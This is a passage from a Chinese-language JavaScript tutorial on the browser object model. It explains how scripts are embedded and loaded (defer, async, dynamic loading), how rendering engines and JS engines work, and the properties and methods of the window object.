- ## BOM

  - 浏览器模型概述

    > JS 是浏览器的内置脚本语言。也就是说，浏览器内置了 JS 引擎，并且提供各种接口，让 JS 脚本可以控制浏览器的各种功能。一旦网页内嵌了 JS 脚本，浏览器加载网页，就会去执行脚本，从而达到操作浏览器的目的，实现网页的各种动态效果。
    >
    > 本章开始介绍浏览器提供的各种 JS 接口。首先，介绍 JS 代码嵌入网页的方法。
    >
    > ## 代码嵌入网页的方法
    >
    > 网页中嵌入 JS 代码，主要有四种方法。
    >
    > - `<script>`元素直接嵌入代码。
    > - `<script>`标签加载外部脚本
    > - 事件属性
    > - URL 协议
    >
    > ### script 元素嵌入代码
    >
    > <script>元素内部可以直接写入 JavaScript 代码。
    >
    > ```
    > <script>
    >   var x = 1 + 5;
    >   console.log(x);
    > </script>
    > ```
    >
    > <script>标签有一个type属性，用来指定脚本类型。对 JavaScript 脚本来说，type属性可以设为两种值。
    >
    > - `text/javascript`：这是默认值，也是历史上一贯设定的值。如果你省略`type`属性，默认就是这个值。对于老式浏览器，设为这个值比较好。
    > - `application/javascript`：对于较新的浏览器，建议设为这个值。
    >
    > ```
    > <script type="application/javascript">
    >   console.log('Hello World');
    > </script>
    > ```
    >
    > 由于`<script>`标签默认就是 JS 代码。所以，嵌入 JS 脚本时，`type`属性可以省略。
    >
    > 如果`type`属性的值，浏览器不认识，那么它不会执行其中的代码。利用这一点，可以在`<script>`标签之中嵌入任意的文本内容，只要加上一个浏览器不认识的`type`属性即可。
    >
    > ```
    > <script id="mydata" type="x-custom-data">
    >   console.log('Hello World');
    > </script>
    > ```
    >
    > 上面的代码，浏览器不会执行，也不会显示它的内容，因为不认识它的`type`属性。但是，这个`<script>`节点依然存在于 DOM 之中，可以使用`<script>`节点的`text`属性读出它的内容。
    >
    > ```
    > document.getElementById('mydata').text
    > //   console.log('Hello World');
    > ```
    >
    > ### script 元素加载外部脚本
    >
    > <script>标签也可以指定加载外部的脚本文件。
    >
    > ```
    > <script src="https://www.example.com/script.js"></script>
    > ```
    >
    > 如果脚本文件使用了非英语字符，还应该注明字符的编码。
    >
    > ```
    > <script charset="utf-8" src="https://www.example.com/script.js"></script>
    > ```
    >
    > 所加载的脚本必须是纯的 JS 代码，不能有`HTML`代码和`<script>`标签。
    >
    > 加载外部脚本和直接添加代码块，这两种方法不能混用。下面代码的`console.log`语句直接被忽略。
    >
    > ```
    > <script charset="utf-8" src="example.js">
    >   console.log('Hello World!');
    > </script>
    > ```
    >
    > 为了防止攻击者篡改外部脚本，`script`标签允许设置一个`integrity`属性，写入该外部脚本的 Hash 签名，用来验证脚本的一致性。
    >
    > ```
    > <script src="/assets/application.js"
    >   integrity="sha256-TvVUHzSfftWg1rcfL6TIJ0XKEGrgLyEq6lEpcmrG9qs=">
    > </script>
    > ```
    >
    > 上面代码中，`script`标签有一个`integrity`属性，指定了外部脚本`/assets/application.js`的 SHA256 签名。一旦有人改了这个脚本，导致 SHA256 签名不匹配，浏览器就会拒绝加载。
    >
    > ### 事件属性
    >
    > 网页元素的事件属性（比如`onclick`和`onmouseover`），可以写入 JS 代码。当指定事件发生时，就会调用这些代码。
    >
    > ```
    > <button id="myBtn" onclick="console.log(this.id)">点击</button>
    > ```
    >
    > 上面的事件属性代码只有一个语句。如果有多个语句，使用分号分隔即可。
    >
    > ### URL 协议
    >
    > URL 支持`javascript:`协议，即在 URL 的位置写入代码，使用这个 URL 的时候就会执行 JS 代码。
    >
    > ```
    > <a href="javascript:console.log('Hello')">点击</a>
    > ```
    >
    > 浏览器的地址栏也可以执行`javascript:`协议。将`javascript:console.log('Hello')`放入地址栏，按回车键也会执行这段代码。
    >
    > 如果 JS 代码返回一个字符串，浏览器就会新建一个文档，展示这个字符串的内容，原有文档的内容都会消失。
    >
    > ```
    > <a href="javascript: new Date().toLocaleTimeString();">点击</a>
    > ```
    >
    > 上面代码中，用户点击链接以后，会打开一个新文档，里面有当前时间。
    >
    > 如果返回的不是字符串，那么浏览器不会新建文档，也不会跳转。
    >
    > ```
    > <a href="javascript: console.log(new Date().toLocaleTimeString())">点击</a>
    > ```
    >
    > 上面代码中，用户点击链接后，网页不会跳转，只会在控制台显示当前时间。
    >
    > `javascript:`协议的常见用途是书签脚本 Bookmarklet。由于浏览器的书签保存的是一个网址，所以`javascript:`网址也可以保存在里面，用户选择这个书签的时候，就会在当前页面执行这个脚本。为了防止书签替换掉当前文档，可以在脚本前加上`void`，或者在脚本最后加上`void 0`。
    >
    > ```
    > <a href="javascript: void new Date().toLocaleTimeString();">点击</a>
    > <a href="javascript: new Date().toLocaleTimeString();void 0;">点击</a>
    > ```
    >
    > 上面这两种写法，点击链接后，执行代码都不会网页跳转。
    >
    > ## script 元素
    >
    > ### 工作原理
    >
    > 浏览器加载 JS 脚本，主要通过`<script>`元素完成。正常的网页加载流程是这样的。
    >
    > 1. 浏览器一边下载 HTML 网页，一边开始解析。也就是说，不等到下载完，就开始解析。
    > 2. 解析过程中，浏览器发现`<script>`元素，就暂停解析，把网页渲染的控制权转交给 JS 引擎。
    > 3. 如果`<script>`元素引用了外部脚本，就下载该脚本再执行，否则就直接执行代码。
    > 4. JS 引擎执行完毕，控制权交还渲染引擎，恢复往下解析 HTML 网页。
    >
    > 加载外部脚本时，浏览器会暂停页面渲染，等待脚本下载并执行完成后，再继续渲染。原因是 JS 代码可以修改 DOM，所以必须把控制权让给它，否则会导致复杂的线程竞赛的问题。
    >
    > 如果外部脚本加载时间很长（一直无法完成下载），那么浏览器就会一直等待脚本下载完成，造成网页长时间失去响应，浏览器就会呈现“假死”状态，这被称为“阻塞效应”。
    >
    > 为了避免这种情况，较好的做法是将`<script>`标签都放在页面底部，而不是头部。这样即使遇到脚本失去响应，网页主体的渲染也已经完成了，用户至少可以看到内容，而不是面对一张空白的页面。如果某些脚本代码非常重要，一定要放在页面头部的话，最好直接将代码写入页面，而不是连接外部脚本文件，这样能缩短加载时间。
    >
    > 脚本文件都放在网页尾部加载，还有一个好处。因为在 DOM 结构生成之前就调用 DOM 节点，JS 会报错，如果脚本都在网页尾部加载，就不存在这个问题，因为这时 DOM 肯定已经生成了。
    >
    > ```
    > <head>
    >   <script>
    >     console.log(document.body.innerHTML);
    >   </script>
    > </head>
    > <body>
    > </body>
    > ```
    >
    > 上面代码执行时会报错，因为此时`document.body`元素还未生成。
    >
    > 一种解决方法是设定`DOMContentLoaded`事件的回调函数。
    >
    > ```
    > <head>
    >   <script>
    >     document.addEventListener(
    >       'DOMContentLoaded',
    >       function (event) {
    >         console.log(document.body.innerHTML);
    >       }
    >     );
    >   </script>
    > </head>
    > ```
    >
    > 上面代码中，指定`DOMContentLoaded`事件发生后，才开始执行相关代码。`DOMContentLoaded`事件只有在 DOM 结构生成之后才会触发。
    >
    > 另一种解决方法是，使用`<script>`标签的`onload`属性。当`<script>`标签指定的外部脚本文件下载和解析完成，会触发一个`load`事件，可以把所需执行的代码，放在这个事件的回调函数里面。
    >
    > ```
    > <script src="jquery.min.js" onload="console.log(document.body.innerHTML)">
    > </script>
    > ```
    >
    > 但是，如果将脚本放在页面底部，就可以完全按照正常的方式写，上面两种方式都不需要。
    >
    > ```
    > <body>
    >   <!-- 其他代码  -->
    >   <script>
    >     console.log(document.body.innerHTML);
    >   </script>
    > </body>
    > ```
    >
    > 如果有多个`script`标签，比如下面这样。
    >
    > ```
    > <script src="a.js"></script>
    > <script src="b.js"></script>
    > ```
    >
    > 浏览器会同时并行下载`a.js`和`b.js`，但是，执行时会保证先执行`a.js`，然后再执行`b.js`，即使后者先下载完成，也是如此。也就是说，脚本的执行顺序由它们在页面中的出现顺序决定，这是为了保证脚本之间的依赖关系不受到破坏。当然，加载这两个脚本都会产生“阻塞效应”，必须等到它们都加载完成，浏览器才会继续页面渲染。
    >
    > 解析和执行 CSS，也会产生阻塞。Firefox 浏览器会等到脚本前面的所有样式表，都下载并解析完，再执行脚本；Webkit则是一旦发现脚本引用了样式，就会暂停执行脚本，等到样式表下载并解析完，再恢复执行。
    >
    > 此外，对于来自同一个域名的资源，比如脚本文件、样式表文件、图片文件等，浏览器一般有限制，同时最多下载6～20个资源，即最多同时打开的 TCP 连接有限制，这是为了防止对服务器造成太大压力。如果是来自不同域名的资源，就没有这个限制。所以，通常把静态文件放在不同的域名之下，以加快下载速度。
    >
    > ### defer 属性
    >
    > 为了解决脚本文件下载阻塞网页渲染的问题，一个方法是对`<script>`元素加入`defer`属性。它的作用是延迟脚本的执行，等到 DOM 加载生成后，再执行脚本。
    >
    > ```
    > <script src="a.js" defer></script>
    > <script src="b.js" defer></script>
    > ```
    >
    > 上面代码中，只有等到 DOM 加载完成后，才会执行`a.js`和`b.js`。
    >
    > `defer`属性的运行流程如下。
    >
    > 1. 浏览器开始解析 HTML 网页。
    > 2. 解析过程中，发现带有`defer`属性的`<script>`元素。
    > 3. 浏览器继续往下解析 HTML 网页，同时并行下载`<script>`元素加载的外部脚本。
    > 4. 浏览器完成解析 HTML 网页，此时再回过头执行已经下载完成的脚本。
    >
    > 有了`defer`属性，浏览器下载脚本文件的时候，不会阻塞页面渲染。下载的脚本文件在`DOMContentLoaded`事件触发前执行（即刚刚读取完`</html>`标签），而且可以保证执行顺序就是它们在页面上出现的顺序。
    >
    > 对于内置而不是加载外部脚本的`script`标签，以及动态生成的`script`标签，`defer`属性不起作用。另外，使用`defer`加载的外部脚本不应该使用`document.write`方法。
    >
    > ### async 属性
    >
    > 解决“阻塞效应”的另一个方法是对`<script>`元素加入`async`属性。
    >
    > ```
    > <script src="a.js" async></script>
    > <script src="b.js" async></script>
    > ```
    >
    > `async`属性的作用是，使用另一个进程下载脚本，下载时不会阻塞渲染。
    >
    > 1. 浏览器开始解析 HTML 网页。
    > 2. 解析过程中，发现带有`async`属性的`script`标签。
    > 3. 浏览器继续往下解析 HTML 网页，同时并行下载`<script>`标签中的外部脚本。
    > 4. 脚本下载完成，浏览器暂停解析 HTML 网页，开始执行下载的脚本。
    > 5. 脚本执行完毕，浏览器恢复解析 HTML 网页。
    >
    > `async`属性可以保证脚本下载的同时，浏览器继续渲染。需要注意的是，一旦采用这个属性，就无法保证脚本的执行顺序。哪个脚本先下载结束，就先执行那个脚本。另外，使用`async`属性的脚本文件里面的代码，不应该使用`document.write`方法。
    >
    > `defer`属性和`async`属性到底应该使用哪一个？
    >
    > 一般来说，如果脚本之间没有依赖关系，就使用`async`属性，如果脚本之间有依赖关系，就使用`defer`属性。如果同时使用`async`和`defer`属性，后者不起作用，浏览器行为由`async`属性决定。
    >
    > ### 脚本的动态加载
    >
    > <script>元素还可以动态生成，生成后再插入页面，从而实现脚本的动态加载。
    >
    > ```
    > ['a.js', 'b.js'].forEach(function(src) {
    >   var script = document.createElement('script');
    >   script.src = src;
    >   document.head.appendChild(script);
    > });
    > ```
    >
    > 这种方法的好处是，动态生成的`script`标签不会阻塞页面渲染，也就不会造成浏览器假死。但是问题在于，这种方法无法保证脚本的执行顺序，哪个脚本文件先下载完成，就先执行哪个。
    >
    > 如果想避免这个问题，可以设置async属性为`false`。
    >
    > ```
    > ['a.js', 'b.js'].forEach(function(src) {
    >   var script = document.createElement('script');
    >   script.src = src;
    >   script.async = false;
    >   document.head.appendChild(script);
    > });
    > ```
    >
    > 上面的代码不会阻塞页面渲染，而且可以保证`b.js`在`a.js`后面执行。不过需要注意的是，在这段代码后面加载的脚本文件，会因此都等待`b.js`执行完成后再执行。
    >
    > 如果想为动态加载的脚本指定回调函数，可以使用下面的写法。
    >
    > ```
    > function loadScript(src, done) {
    >   var js = document.createElement('script');
    >   js.src = src;
    >   js.onload = function() {
    >     done();
    >   };
    >   js.onerror = function() {
    >     done(new Error('Failed to load script ' + src));
    >   };
    >   document.head.appendChild(js);
    > }
    > ```
    >
    > ### 加载使用的协议
    >
    > 如果不指定协议，浏览器默认采用 HTTP 协议下载。
    >
    > ```
    > <script src="example.js"></script>
    > ```
    >
    > 上面的`example.js`默认就是采用 HTTP 协议下载，如果要采用 HTTPS 协议下载，必需写明。
    >
    > ```
    > <script src="https://example.js"></script>
    > ```
    >
    > 但是有时我们会希望，根据页面本身的协议来决定加载协议，这时可以采用下面的写法。
    >
    > ```
    > <script src="//example.js"></script>
    > ```
    >
    > ## 浏览器的组成
    >
    > 浏览器的核心是两部分：渲染引擎和 JS 解释器（又称 JS 引擎）。
    >
    > ### 渲染引擎
    >
    > 渲染引擎的主要作用是，将网页代码渲染为用户视觉可以感知的平面文档。
    >
    > 不同的浏览器有不同的渲染引擎。
    >
    > - Firefox：Gecko 引擎
    > - Safari：WebKit 引擎
    > - Chrome：Blink 引擎
    > - IE: Trident 引擎
    > - Edge: EdgeHTML 引擎
    >
    > 渲染引擎处理网页，通常分成四个阶段。
    >
    > 1. 解析代码：HTML 代码解析为 DOM，CSS 代码解析为 CSSOM（CSS Object Model）。
    > 2. 对象合成：将 DOM 和 CSSOM 合成一棵渲染树（render tree）。
    > 3. 布局：计算出渲染树的布局（layout）。
    > 4. 绘制：将渲染树绘制到屏幕。
    >
    > 以上四步并非严格按顺序执行，往往第一步还没完成，第二步和第三步就已经开始了。所以，会看到这种情况：网页的 HTML 代码还没下载完，但浏览器已经显示出内容了。
    >
    > ### 重流和重绘
    >
    > 渲染树转换为网页布局，称为“布局流”（flow）；布局显示到页面的这个过程，称为“绘制”（paint）。它们都具有阻塞效应，并且会耗费很多时间和计算资源。
    >
    > 页面生成以后，脚本操作和样式表操作，都会触发“重流”（reflow）和“重绘”（repaint）。用户的互动也会触发重流和重绘，比如设置了鼠标悬停（`a:hover`）效果、页面滚动、在输入框中输入文本、改变窗口大小等等。
    >
    > 重流和重绘并不一定一起发生，重流必然导致重绘，重绘不一定需要重流。比如改变元素颜色，只会导致重绘，而不会导致重流；改变元素的布局，则会导致重绘和重流。
    >
    > 大多数情况下，浏览器会智能判断，将重流和重绘只限制到相关的子树上面，最小化所耗费的代价，而不会全局重新生成网页。
    >
    > 作为开发者，应该尽量设法降低重绘的次数和成本。比如，尽量不要变动高层的 DOM 元素，而以底层 DOM 元素的变动代替；再比如，重绘`table`布局和`flex`布局，开销都会比较大。
    >
    > ```
    > var foo = document.getElementById('foobar');
    > 
    > foo.style.color = 'blue';
    > foo.style.marginTop = '30px';
    > ```
    >
    > 上面的代码只会导致一次重绘，因为浏览器会累积 DOM 变动，然后一次性执行。
    >
    > 下面是一些优化技巧。
    >
    > - 读取 DOM 或者写入 DOM，尽量写在一起，不要混杂。不要读取一个 DOM 节点，然后立刻写入，接着再读取一个 DOM 节点。
    > - 缓存 DOM 信息。
    > - 不要一项一项地改变样式，而是使用 CSS class 一次性改变样式。
    > - 使用`documentFragment`操作 DOM
    > - 动画使用`absolute`定位或`fixed`定位，这样可以减少对其他元素的影响。
    > - 只在必要时才显示隐藏元素。
    > - 使用`window.requestAnimationFrame()`，因为它可以把代码推迟到下一次重绘之前执行，而不是立即要求页面重绘。
    > - 使用虚拟 DOM（virtual DOM）库。
    >
    > 下面是一个`window.requestAnimationFrame()`对比效果的例子。
    >
    > ```
    > // 重流代价高
    > function doubleHeight(element) {
    >   var currentHeight = element.clientHeight;
    >   element.style.height = (currentHeight * 2) + 'px';
    > }
    > 
    > all_my_elements.forEach(doubleHeight);
    > 
    > // 重绘代价低
    > function doubleHeight(element) {
    >   var currentHeight = element.clientHeight;
    > 
    >   window.requestAnimationFrame(function () {
    >     element.style.height = (currentHeight * 2) + 'px';
    >   });
    > }
    > 
    > all_my_elements.forEach(doubleHeight);
    > ```
    >
    > 上面的第一段代码，每读一次 DOM，就写入新的值，会造成不停的重排和重流。第二段代码把所有的写操作，都累积在一起，从而 DOM 代码变动的代价就最小化了。
    >
    > ### JS 引擎
    >
    > JS 引擎的主要作用是，读取网页中的 JS 代码，对其处理后运行。
    >
    > JS 是一种解释型语言，也就是说，它不需要编译，由解释器实时运行。这样的好处是运行和修改都比较方便，刷新页面就可以重新解释；缺点是每次运行都要调用解释器，系统开销较大，运行速度慢于编译型语言。
    >
    > 为了提高运行速度，目前的浏览器都将 JS 进行一定程度的编译，生成类似字节码（bytecode）的中间代码，以提高运行速度。
    >
    > 早期，浏览器内部对 JS 的处理过程如下：
    >
    > 1. 读取代码，进行词法分析（Lexical analysis），将代码分解成词元（token）。
    > 2. 对词元进行语法分析（parsing），将代码整理成“语法树”（syntax tree）。
    > 3. 使用“翻译器”（translator），将代码转为字节码（bytecode）。
    > 4. 使用“字节码解释器”（bytecode interpreter），将字节码转为机器码。
    >
    > 逐行解释将字节码转为机器码，是很低效的。为了提高运行速度，现代浏览器改为采用“即时编译”（Just In Time compiler，缩写 JIT），即字节码只在运行时编译，用到哪一行就编译哪一行，并且把编译结果缓存（inline cache）。通常，一个程序被经常用到的，只是其中一小部分代码，有了缓存的编译结果，整个程序的运行速度就会显著提升。
    >
    > 字节码不能直接运行，而是运行在一个虚拟机（Virtual Machine）之上，一般也把虚拟机称为 JS 引擎。并非所有的 JS 虚拟机运行时都有字节码，有的 JS 虚拟机基于源码，即只要有可能，就通过 JIT（just in time）编译器直接把源码编译成机器码运行，省略字节码步骤。这一点与其他采用虚拟机（比如 Java）的语言不尽相同。这样做的目的，是为了尽可能地优化代码、提高性能。下面是目前最常见的一些 JS 虚拟机：
    >
    > - Chakra (Microsoft Internet Explorer)
    > - Nitro/JavaScript Core (Safari)
    > - Carakan (Opera)
    > - SpiderMonkey (Firefox)
    > - V8 (Chrome, Chromium)

  - window 对象

    > ## 概述
    >
    > 浏览器里面，`window`对象（注意，`w`为小写）指当前的浏览器窗口。它也是当前页面的顶层对象，即最高一层的对象，所有其他对象都是它的下属。一个变量如果未声明，那么默认就是顶层对象的属性。
    >
    > ```
    > a = 1;
    > window.a // 1
    > ```
    >
    > 上面代码中，`a`是一个没有声明就直接赋值的变量，它自动成为顶层对象的属性。
    >
    > `window`有自己的实体含义，其实不适合当作最高一层的顶层对象，这是一个语言的设计失误。最早，设计这门语言的时候，原始设想是语言内置的对象越少越好，这样可以提高浏览器的性能。因此，语言设计者 Brendan Eich 就把`window`对象当作顶层对象，所有未声明就赋值的变量都自动变成`window`对象的属性。这种设计使得编译阶段无法检测出未声明变量，但到了今天已经没有办法纠正了。
    >
    > ## window 对象的属性
    >
    > ### window.name
    >
    > `window.name`属性是一个字符串，表示当前浏览器窗口的名字。窗口不一定需要名字，这个属性主要配合超链接和表单的`target`属性使用。
    >
    > ```
    > window.name = 'Hello World!';
    > console.log(window.name)
    > // "Hello World!"
    > ```
    >
    > 该属性只能保存字符串，如果写入的值不是字符串，会自动转成字符串。各个浏览器对这个值的储存容量有所不同，但是一般来说，可以高达几MB。
    >
    > 只要浏览器窗口不关闭，这个属性是不会消失的。举例来说，访问`a.com`时，该页面的脚本设置了`window.name`，接下来在同一个窗口里面载入了`b.com`，新页面的脚本可以读到上一个网页设置的`window.name`。页面刷新也是这种情况。一旦浏览器窗口关闭后，该属性保存的值就会消失，因为这时窗口已经不存在了。
    >
    > ### window.closed，window.opener
    >
    > `window.closed`属性返回一个布尔值，表示窗口是否关闭。
    >
    > ```
    > window.closed // false
    > ```
    >
    > 上面代码检查当前窗口是否关闭。这种检查意义不大，因为只要能运行代码，当前窗口肯定没有关闭。这个属性一般用来检查，使用脚本打开的新窗口是否关闭。
    >
    > ```
    > var popup = window.open();
    > 
    > if ((popup !== null) && !popup.closed) {
    > // 窗口仍然打开着
    > }
    > ```
    >
    > `window.opener`属性表示打开当前窗口的父窗口。如果当前窗口没有父窗口（即直接在地址栏输入打开），则返回`null`。
    >
    > ```
    > window.open().opener === window // true
    > ```
    >
    > 上面表达式会打开一个新窗口，然后返回`true`。
    >
    > 如果两个窗口之间不需要通信，建议将子窗口的`opener`属性显式设为`null`，这样可以减少一些安全隐患。
    >
    > ```
    > var newWin = window.open('example.html', 'newWindow', 'height=400,width=400');
    > newWin.opener = null;
    > ```
    >
    > 上面代码中，子窗口的`opener`属性设为`null`，两个窗口之间就没办法再联系了。
    >
    > 通过`opener`属性，可以获得父窗口的全局属性和方法，但只限于两个窗口同源的情况（参见《同源限制》一章），且其中一个窗口由另一个打开。`<a>`元素添加`rel="noopener"`属性，可以防止新打开的窗口获取父窗口，减轻被恶意网站修改父窗口 URL 的风险。
    >
    > ```
    > <a href="https://an.evil.site" target="_blank" rel="noopener">
    > 恶意网站
    > </a>
    > ```
    >
    > ### window.self，window.window
    >
    > `window.self`和`window.window`属性都指向窗口本身。这两个属性只读。
    >
    > ```
    > window.self === window // true
    > window.window === window // true
    > ```
    >
    > ### window.frames，window.length
    >
    > `window.frames`属性返回一个类似数组的对象，成员为页面内所有框架窗口，包括`frame`元素和`iframe`元素。`window.frames[0]`表示页面中第一个框架窗口。
    >
    > 如果`iframe`元素设置了`id`或`name`属性，那么就可以用属性值，引用这个`iframe`窗口。比如`<iframe name="myIFrame">`可以用`frames['myIFrame']`或者`frames.myIFrame`来引用。
    >
    > `frames`属性实际上是`window`对象的别名。
    >
    > ```
    > frames === window // true
    > ```
    >
    > 因此，`frames[0]`也可以用`window[0]`表示。但是，从语义上看，`frames`更清晰，而且考虑到`window`还是全局对象，因此推荐表示多窗口时，总是使用`frames[0]`的写法。更多介绍请看下文的《多窗口操作》部分。
    >
    > `window.length`属性返回当前网页包含的框架总数。如果当前网页不包含`frame`和`iframe`元素，那么`window.length`就返回`0`。
    >
    > ```
    > window.frames.length === window.length // true
    > ```
    >
    > 上面代码表示，`window.frames.length`与`window.length`应该是相等的。
    >
    > ### window.frameElement
    >
    > `window.frameElement`属性主要用于当前窗口嵌在另一个网页的情况（嵌入`<object>`、`<iframe>`或`<embed>`元素），返回当前窗口所在的那个元素节点。如果当前窗口是顶层窗口，或者所嵌入的那个网页不是同源的，该属性返回`null`。
    >
    > ```
    > // HTML 代码如下
    > // <iframe src="about.html"></iframe>
    > 
    > // 下面的脚本在 about.html 里面
    > var frameEl = window.frameElement;
    > if (frameEl) {
    > frameEl.src = 'other.html';
    > }
    > ```
    >
    > 上面代码中，`frameEl`变量就是`<iframe>`元素。
    >
    > ### window.top，window.parent
    >
    > `window.top`属性指向最顶层窗口，主要用于在框架窗口（frame）里面获取顶层窗口。
    >
    > `window.parent`属性指向父窗口。如果当前窗口没有父窗口，`window.parent`指向自身。
    >
    > ```
    > if (window.parent !== window.top) {
    > // 表明当前窗口嵌入不止一层
    > }
    > ```
    >
    > 对于不包含框架的网页，这两个属性等同于`window`对象。
    >
    > ### window.status
    >
    > `window.status`属性用于读写浏览器状态栏的文本。但是，现在很多浏览器都不允许改写状态栏文本，所以使用这个方法不一定有效。
    >
    > ### window.devicePixelRatio
    >
    > `window.devicePixelRatio`属性返回一个数值，表示一个 CSS 像素的大小与一个物理像素的大小之间的比率。也就是说，它表示一个 CSS 像素由多少个物理像素组成。它可以用于判断用户的显示环境，如果这个比率较大，就表示用户正在使用高清屏幕，因此可以显示较大像素的图片。
    >
    > ### 位置大小属性
    >
    > 以下属性返回`window`对象的位置信息和大小信息。
    >
    > **（1）window.screenX，window.screenY**
    >
    > `window.screenX`和`window.screenY`属性，返回浏览器窗口左上角相对于当前屏幕左上角的水平距离和垂直距离（单位像素）。这两个属性只读。
    >
    > **（2） window.innerHeight，window.innerWidth**
    >
    > `window.innerHeight`和`window.innerWidth`属性，返回网页在当前窗口中可见部分的高度和宽度，即“视口”（viewport）的大小（单位像素）。这两个属性只读。
    >
    > 用户放大网页的时候（比如将网页从100%的大小放大为200%），这两个属性会变小。因为这时网页的像素大小不变（比如宽度还是960像素），只是每个像素占据的屏幕空间变大了，因此可见部分（视口）就变小了。
    >
    > 注意，这两个属性值包括滚动条的高度和宽度。
    >
    > **（3）window.outerHeight，window.outerWidth**
    >
    > `window.outerHeight`和`window.outerWidth`属性返回浏览器窗口的高度和宽度，包括浏览器菜单和边框（单位像素）。这两个属性只读。
    >
    > **（4）window.scrollX，window.scrollY**
    >
    > `window.scrollX`属性返回页面的水平滚动距离，`window.scrollY`属性返回页面的垂直滚动距离，单位都为像素。这两个属性只读。
    >
    > 注意，这两个属性的返回值不是整数，而是双精度浮点数。如果页面没有滚动，它们的值就是`0`。
    >
    > 举例来说，如果用户向下拉动了垂直滚动条75像素，那么`window.scrollY`就是75左右。用户水平向右拉动水平滚动条200像素，`window.scrollX`就是200左右。
    >
    > ```
    > if (window.scrollY < 75) {
    > window.scroll(0, 75);
    > }
    > ```
    >
    > 上面代码中，如果页面向下滚动的距离小于75像素，那么页面向下滚动75像素。
    >
    > **（5）window.pageXOffset，window.pageYOffset**
    >
    > `window.pageXOffset`属性和`window.pageYOffset`属性，是`window.scrollX`和`window.scrollY`别名。
    >
    > ### 组件属性
    >
    > 组件属性返回浏览器的组件对象。这样的属性有下面几个。
    >
    > - `window.locationbar`：地址栏对象
    > - `window.menubar`：菜单栏对象
    > - `window.scrollbars`：窗口的滚动条对象
    > - `window.toolbar`：工具栏对象
    > - `window.statusbar`：状态栏对象
    > - `window.personalbar`：用户安装的个人工具栏对象
    >
    > 这些对象的`visible`属性是一个布尔值，表示这些组件是否可见。这些属性只读。
    >
    > ```
    > window.locationbar.visible
    > window.menubar.visible
    > window.scrollbars.visible
    > window.toolbar.visible
    > window.statusbar.visible
    > window.personalbar.visible
    > ```
    >
    > ### 全局对象属性
    >
    > 全局对象属性指向一些浏览器原生的全局对象。
    >
    > - `window.document`：指向`document`对象，详见《document 对象》一章。注意，这个属性有同源限制。只有来自同源的脚本才能读取这个属性。
    > - `window.location`：指向`Location`对象，用于获取当前窗口的 URL 信息。它等同于`document.location`属性，详见《Location 对象》一章。
    > - `window.navigator`：指向`Navigator`对象，用于获取环境信息，详见《Navigator 对象》一章。
    > - `window.history`：指向`History`对象，表示浏览器的浏览历史，详见《History 对象》一章。
    > - `window.localStorage`：指向本地储存的 localStorage 数据，详见《Storage 接口》一章。
    > - `window.sessionStorage`：指向本地储存的 sessionStorage 数据，详见《Storage 接口》一章。
    > - `window.console`：指向`console`对象，用于操作控制台，详见《console 对象》一章。
    > - `window.screen`：指向`Screen`对象，表示屏幕信息，详见《Screen 对象》一章。
    >
    > ### window.isSecureContext
    >
    > `window.isSecureContext`属性返回一个布尔值，表示当前窗口是否处在加密环境。如果是 HTTPS 协议，就是`true`，否则就是`false`。
    >
    > ## window 对象的方法
    >
    > ### window.alert()，window.prompt()，window.confirm()
    >
    > `window.alert()`、`window.prompt()`、`window.confirm()`都是浏览器与用户互动的全局方法。它们会弹出不同的对话框，要求用户做出回应。注意，这三个方法弹出的对话框，都是浏览器统一规定的式样，无法定制。
    >
    > **（1）window.alert()**
    >
    > `window.alert()`方法弹出的对话框，只有一个“确定”按钮，往往用来通知用户某些信息。
    >
    > ```
    > window.alert('Hello World');
    > ```
    >
    > 用户只有点击“确定”按钮，对话框才会消失。对话框弹出期间，浏览器窗口处于冻结状态，如果不点“确定”按钮，用户什么也干不了。
    >
    > `window.alert()`方法的参数只能是字符串，没法使用 CSS 样式，但是可以用`\n`指定换行。
    >
    > ```
    > alert('本条提示\n分成两行');
    > ```
    >
    > **（2）window.prompt()**
    >
    > `window.prompt()`方法弹出的对话框，提示文字的下方，还有一个输入框，要求用户输入信息，并有“确定”和“取消”两个按钮。它往往用来获取用户输入的数据。
    >
    > ```
    > var result = prompt('您的年龄？', 25)
    > ```
    >
    > 上面代码会跳出一个对话框，文字提示为“您的年龄？”，要求用户在对话框中输入自己的年龄（默认显示25）。用户填入的值，会作为返回值存入变量`result`。
    >
    > `window.prompt()`的返回值有两种情况，可能是字符串（有可能是空字符串），也有可能是`null`。具体分成三种情况。
    >
    > 1. 用户输入信息，并点击“确定”，则用户输入的信息就是返回值。
    > 2. 用户没有输入信息，直接点击“确定”，则输入框的默认值就是返回值。
    > 3. 用户点击了“取消”（或者按了 ESC 按钮），则返回值是`null`。
    >
    > `window.prompt()`方法的第二个参数是可选的，但是最好总是提供第二个参数，作为输入框的默认值。
    >
    > **（3）window.confirm()**
    >
    > `window.confirm()`方法弹出的对话框，除了提示信息之外，只有“确定”和“取消”两个按钮，往往用来征询用户是否同意。
    >
    > ```
    > var result = confirm('你最近好吗？');
    > ```
    >
    > 上面代码弹出一个对话框，上面只有一行文字“你最近好吗？”，用户选择点击“确定”或“取消”。
    >
    > `confirm`方法返回一个布尔值，如果用户点击“确定”，返回`true`；如果用户点击“取消”，则返回`false`。
    >
    > ```
    > var okay = confirm('Please confirm this message.');
    > if (okay) {
    >   // 用户按下“确定”
    > } else {
    >   // 用户按下“取消”
    > }
    > ```
    >
    > `confirm`的一个用途是，用户离开当前页面时，弹出一个对话框，问用户是否真的要离开。
    >
    > ```
    > window.onunload = function () {
    >   return window.confirm('你确定要离开当面页面吗？');
    > }
    > ```
    >
    > 这三个方法都具有堵塞效应，一旦弹出对话框，整个页面就是暂停执行，等待用户做出反应。
    >
    > ### window.open(), window.close()，window.stop()
    >
    > **（1）window.open()**
    >
    > `window.open`方法用于新建另一个浏览器窗口，类似于浏览器菜单的新建窗口选项。它会返回新窗口的引用，如果无法新建窗口，则返回`null`。
    >
    > ```
    > var popup = window.open('somefile.html');
    > ```
    >
    > 上面代码会让浏览器弹出一个新建窗口，网址是当前域名下的`somefile.html`。
    >
    > `open`方法一共可以接受三个参数。
    >
    > ```
    > window.open(url, windowName, [windowFeatures])
    > ```
    >
    > - `url`：字符串，表示新窗口的网址。如果省略，默认网址就是`about:blank`。
    > - `windowName`：字符串，表示新窗口的名字。如果该名字的窗口已经存在，则占用该窗口，不再新建窗口。如果省略，就默认使用`_blank`，表示新建一个没有名字的窗口。另外还有几个预设值，`_self`表示当前窗口，`_top`表示顶层窗口，`_parent`表示上一层窗口。
